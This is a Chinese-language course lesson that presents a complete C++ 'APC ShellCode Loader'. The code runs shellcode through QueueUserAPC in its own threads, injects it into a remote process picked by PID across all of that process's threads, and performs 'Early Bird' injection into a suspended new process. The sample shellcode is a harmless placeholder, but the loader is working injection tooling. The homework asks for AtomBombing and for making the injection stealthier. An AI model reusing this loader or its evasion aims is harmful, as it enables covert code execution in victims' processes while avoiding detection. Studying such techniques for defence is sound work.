# 课时08 - C++ UserAPC实现ShellCode Loader

## 课程目标
1. 理解APC（异步过程调用）机制
2. 掌握QueueUserAPC的使用方法
3. 实现APC方式执行ShellCode
4. 了解APC注入的隐蔽性

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| APC | Asynchronous Procedure Call | 异步过程调用，在特定线程上下文执行 |
| QueueUserAPC | - | 向线程APC队列添加用户模式APC |
| Alertable | 可警醒状态 | 线程处于可接收APC的状态 |
| SleepEx | - | 可警醒的休眠函数 |

## 代码实现

```cpp
// apc_loader.cpp
// APC方式执行ShellCode

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,
    0x31, 0xC0, 0x40, 0xC3
};

// 方法1: 自身线程APC
void Method1_SelfAPC() {
    printf("[*] Method 1: Self Thread APC\n");
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 向当前线程添加APC
    HANDLE hThread = GetCurrentThread();
    
    if (QueueUserAPC((PAPCFUNC)mem, hThread, 0)) {
        printf("[+] APC queued\n");
        
        // 进入可警醒状态以执行APC
        SleepEx(0, TRUE);
        
        printf("[+] APC executed\n");
    } else {
        printf("[-] QueueUserAPC failed\n");
    }
    
    VirtualFree(mem, 0, MEM_RELEASE);
}

// 方法2: 新建线程的APC
DWORD WINAPI AlertableThread(LPVOID param) {
    // 持续处于可警醒状态
    while (TRUE) {
        SleepEx(INFINITE, TRUE);
    }
    return 0;
}

void Method2_NewThreadAPC() {
    printf("[*] Method 2: New Thread APC\n");
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 创建可警醒线程
    HANDLE hThread = CreateThread(NULL, 0, AlertableThread, NULL, 0, NULL);
    
    if (!hThread) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    // 等待线程启动
    Sleep(100);
    
    // 添加APC
    if (QueueUserAPC((PAPCFUNC)mem, hThread, 0)) {
        printf("[+] APC queued to new thread\n");
        Sleep(500);  // 等待执行
        printf("[+] APC should have executed\n");
    }
    
    TerminateThread(hThread, 0);
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
}

// 方法3: 远程进程APC注入
BOOL InjectAPC(DWORD pid, const void* code, SIZE_T size) {
    printf("[*] Method 3: Remote APC Injection to PID %lu\n", pid);
    
    // 打开进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    
    if (!hProcess) {
        printf("[-] OpenProcess failed\n");
        return FALSE;
    }
    
    // 分配远程内存
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Remote memory: %p\n", remoteMem);
    
    // 写入ShellCode
    SIZE_T written;
    WriteProcessMemory(hProcess, remoteMem, code, size, &written);
    
    // 枚举目标进程的线程
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    
    int apcCount = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    if (QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0)) {
                        apcCount++;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    
    printf("[+] Queued APC to %d threads\n", apcCount);
    
    CloseHandle(hProcess);
    return apcCount > 0;
}

// 方法4: Early Bird APC注入
BOOL EarlyBirdInject(const wchar_t* targetExe, const void* code, SIZE_T size) {
    printf("[*] Method 4: Early Bird APC Injection\n");
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 以挂起状态创建进程
    if (!CreateProcessW(targetExe, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed\n");
        return FALSE;
    }
    
    printf("[+] Created suspended process: %lu\n", pi.dwProcessId);
    
    // 分配内存
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    // 写入ShellCode
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remoteMem, code, size, &written);
    
    printf("[+] Written %zu bytes to %p\n", written, remoteMem);
    
    // 添加APC到主线程
    if (QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0)) {
        printf("[+] APC queued to main thread\n");
    }
    
    // 恢复线程（APC将在线程恢复时执行）
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed\n");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("     APC ShellCode Loader              \n");
    printf("========================================\n\n");
    
    Method1_SelfAPC();
    printf("\n");
    
    Method2_NewThreadAPC();
    printf("\n");
    
    // 远程注入
    if (argc >= 2) {
        DWORD pid = atoi(argv[1]);
        InjectAPC(pid, shellcode, sizeof(shellcode));
    }
    
    return 0;
}
```

## 课后作业

### 作业1：实现AtomBombing
研究AtomBombing技术并实现简单版本。

### 作业2：优化Early Bird
改进Early Bird注入，使其更加隐蔽。
